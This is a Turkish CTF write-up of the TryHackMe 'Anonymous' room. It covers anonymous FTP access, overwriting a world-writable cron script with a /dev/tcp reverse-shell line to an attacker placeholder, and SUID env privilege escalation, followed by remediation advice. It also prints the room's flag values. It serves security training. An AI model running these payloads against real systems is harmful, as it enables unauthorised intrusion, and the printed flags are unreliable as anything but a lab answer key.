# 👤 Anonymous — TryHackMe Çözüm Raporu (Writeup)

> **Yazar:** Miraç Akkuş (LatenT)
> **Tarih:** Mayıs 2026
> **Oda:** [Anonymous]()

---

## 🚩 Ele Geçirilen Bayraklar (Flags)

| Bayrak | Konum | Değer |
| --- | --- | --- |
| **User Flag** | `/home/namelessone/user.txt` | `90d6f992585815ff991e68748c414740` |
| **Root Flag** | `/root/root.txt` | `4d930091c85047a7d0be40093f3e7c02` |

---

## 📋 Özet

Bu rapor, **Anonymous** makinesinin tam yetkiyle ele geçirilme sürecini dökümante eder. Saldırı zinciri; anonim FTP erişimiyle başlar, herkes tarafından yazılabilir (world-writable) betikler üzerinden cronjob istismarı ile devam eder ve SUID bitine sahip ikili dosyaların suistimali ile en üst yetki seviyesine (root) ulaşır. Bu çalışma; yanlış yapılandırılmış FTP servisleri, güvensiz dosya izinleri ve gereksiz SUID yetkilerinin yarattığı kritik güvenlik risklerini vurgulamaktadır.

---

## 🛠️ Araçlar ve Teknolojiler

| Araç | Kullanım Amacı |
| --- | --- |
| `nmap` | Ağ keşfi ve servis taraması |
| `smbclient` | SMB paylaşımlarının analizi ve erişimi |
| `ftp` | Anonim FTP etkileşimi |
| `nc` (Netcat) | Reverse shell dinleyici (listener) |
| `find` | SUID yetkili dosyaların tespiti |

---

## 🔍 Aşama 1: Keşif ve Bilgi Toplama

### Ağ Taraması

```bash
nmap -sV -sC -T4 <HEDEF_IP>

```

### Bulgular

| Port | Durum | Servis | Versiyon | Notlar |
| --- | --- | --- | --- | --- |
| 21/tcp | açık | FTP | vsftpd 2.0.8 | Anonim giriş (Anonymous) aktif |
| 22/tcp | açık | SSH | OpenSSH 7.6p1 Ubuntu | Standart erişim noktası |
| 139/tcp | açık | NetBIOS | Samba smbd 3.X-4.X | Misafir girişi mümkün |
| 445/tcp | açık | NetBIOS | Samba smbd 4.7.6-Ubuntu | Paylaşım taraması mümkün |

**Kritik Gözlemler:**

* FTP servisi, `anonymous` hesabı ile şifresiz girişe izin veriyor.
* SMB paylaşımları ek saldırı yüzeyi oluşturabilir.
* SSH açık fakat henüz geçerli bir kimlik bilgisi yok.

### SMB Taraması

```bash
smbclient -L <HEDEF_IP>

```

**Tespit Edilen Paylaşımlar:**

| Paylaşım | Erişim | İçerik |
| --- | --- | --- |
| `pics` | Okuma | 2 adet görsel dosya (köpek resimleri) |

**Steganografi Analizi:**
Görseller gizli veri için analiz edildi; ancak gömülü bir veri veya steganografik içerik tespit edilmedi.

---

## 🌐 Aşama 2: İlk Erişim (FTP İstismarı)

### Anonim FTP Girişi

```bash
ftp <HEDEF_IP>
Kullanıcı Adı: anonymous
Şifre: (boş bırakın veya herhangi bir şey yazın)

```

### Dizin Taraması

**Tespit Edilen Yol:** `/scripts/`

**İçerik:**

| Dosya | İzinler | Amaç |
| --- | --- | --- |
| `clean.sh` | `-rwxr-xrwx` | Temizlik betiği (herkes yazabilir) |
| `removed_files.log` | `-rw-r--r--` | Çalıştırma günlüğü |
| `to_do.txt` | `-rw-r--r--` | Yönetici notu |

**Kritik Bulgu:** `clean.sh` dosyası **herkes tarafından yazılabilir** (`-rwxr-xrwx`) durumdadır ve periyodik olarak bir cronjob aracılığıyla çalışmaktadır.

### Yönetici Notu (`to_do.txt`)

```
I really need to disable the anonymous login... it's really not safe
(Gerçekten anonim girişi kapatmam lazım... hiç güvenli değil)

```

### Betik Analizi (`clean.sh`)

```bash
#!/bin/bash
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
    echo "Running cleanup script: nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi

```

**Zafiyet Değerlendirmesi:**

* Betik, `namelessone` kullanıcısı yetkileriyle cronjob üzerinden çalışıyor.
* Yazma izinleri, betiğe keyfi kod enjekte edilmesine olanak tanıyor.

---

## 🐚 Aşama 3: Reverse Shell Bağlantısı

### Payload Hazırlığı

`clean.sh` dosyasını, saldırgan makineye bağlantı gönderecek şekilde değiştirdim:

```bash
#!/bin/bash
bash -i >& /dev/tcp/<SALDIRGAN_IP>/4444 0>&1

```

### Dinleyici (Listener) Yapılandırması

```bash
nc -lvnp 4444

```

### Payload Gönderimi

```bash
ftp <HEDEF_IP>
cd scripts
put clean.sh

```

### Tetiklenme

Cronjob bir sonraki çalıştırma döngüsüne girdiğinde:

```bash
Connection received on <SALDIRGAN_IP> 4444
namelessone@anonymous:~$

```

**Sonuç:** `namelessone` kullanıcısı olarak interaktif kabuk (shell) elde edildi.

---

## 🏴 Aşama 4: Kullanıcı Bayrağı (User Flag)

```bash
cat /home/namelessone/user.txt

```

**User Flag:** `90d6f992585815ff991e68748c414740`

---

## 🚀 Aşama 5: Yetki Yükseltme (Privilege Escalation)

### SUID Dosya Taraması

```bash
find / -perm -4000 2>/dev/null

```

**Kritik Bulgu:** `/usr/bin/env` dosyasının SUID biti set edilmiş (`-rwsr-xr-x`).

### SUID Analizi

| Dosya | Sahibi | İzinler | Risk Seviyesi |
| --- | --- | --- | --- |
| `/usr/bin/env` | root | `-rwsr-xr-x` | 🔴 Kritik |

**Neden Tehlikeli?**
`env` komutu SUID yetkisiyle çalıştığında, üst seviye yetkileri koruyarak herhangi bir işlemi başlatabilir. GTFOBins üzerinde bilinen bir yetki yükseltme yöntemidir.

### GTFOBins İstismarı

```bash
/usr/bin/env /bin/sh -p

```

**Teknik Detay:**

1. `/usr/bin/env` dosyası SUID sayesinde `euid=0` (root) ile çalışır.
2. `/bin/sh -p` komutu ile yetkili bir kabuk çağrılır.
3. `-p` bayrağı, yetkilerin düşürülmesini engeller.
4. Sonuç: Şifresiz root shell.

---

## 🏁 Aşama 6: Root Bayrağı (Root Flag)

```bash
cat /root/root.txt

```

**Root Flag:** `4d930091c85047a7d0be40093f3e7c02`

---

## 🗺️ Saldırı Yolu Görselleştirmesi

```
[Saldırgan]
    │
    ├───nmap───► [Hedef: 21,22,139,445]
    │                │
    │                ▼
    │        [SMB: pics paylaşımı (görseller)]
    │                │
    │                ▼
    │        [FTP: Anonim giriş aktif]
    │                │
    │                ▼
    │        [/scripts/ dizini keşfi]
    │                │
    │                ▼
    │        [clean.sh analizi]
    │                │
    │                ▼
    │        [Yazılabilir dosya + cronjob]
    │                │
    │                ▼
    │        [Reverse shell payload enjeksiyonu]
    │                │
    │                ▼
    │        [namelessone shell erişimi]
    │                │
    │                ▼
    │        [SUID taraması: /usr/bin/env]
    │                │
    │                ▼
    │        [GTFOBins: env → root]
    │                │
    │                ▼
    └────────► [Root Shell + Bayraklar]

```

---

## 🛡️ Zafiyet Değerlendirmesi ve Çözüm Önerileri

| # | Zafiyet | Şiddet | CVSS | Çözüm |
| --- | --- | --- | --- | --- |
| 1 | **Anonim FTP Aktif** | 🟠 Yüksek | 7.5 | Anonim erişimi kapatın; kimlik doğrulamayı zorunlu kılın. |
| 2 | **Yazılabilir Betikler** | 🔴 Kritik | 9.1 | Diğer kullanıcıların yazma yetkisini kaldırın (`chmod o-w`). |
| 3 | **Cronjob İstismarı** | 🔴 Kritik | 8.8 | Cronjob tarafından çalıştırılan dosyaların bütünlüğünü denetleyin. |
| 4 | **Gereksiz SUID Yetkileri** | 🔴 Kritik | 9.0 | `env` üzerindeki SUID bitini kaldırın (`chmod u-s`). |
| 5 | **Düz Metin Notlar** | 🟡 Orta | 5.3 | Hassas bilgileri şifreli kanallarda saklayın. |

---

## 🎓 Önemli Çıkarımlar

1. **Anonim FTP büyük bir risktir:** Her zaman anonim erişimli dizinlerin yazma izinlerini kontrol edin.
2. **Dünya genelinde yazılabilir betik + Cronjob = Shell:** Linux yetki yükseltmede klasik ama etkili bir yoldur.
3. **SUID taraması zorunludur:** `find / -perm -4000` komutu her sızma testinde standart olmalıdır.
4. **GTFOBins hayat kurtarır:** `env` üzerindeki SUID yetkisinin anında root erişimi verdiğini unutmayın.

---

> **⚠️ Yasal Uyarı:** Bu rapor yalnızca eğitim ve araştırma amaçlıdır. Sahibi olmadığınız sistemler üzerinde test yapmadan önce her zaman yazılı izin alın. Yetkisiz erişim yasal suçtur.

---

**Yazar:** Miraç Akkuş (LatenT)

**Tarih:** Mayıs 2026
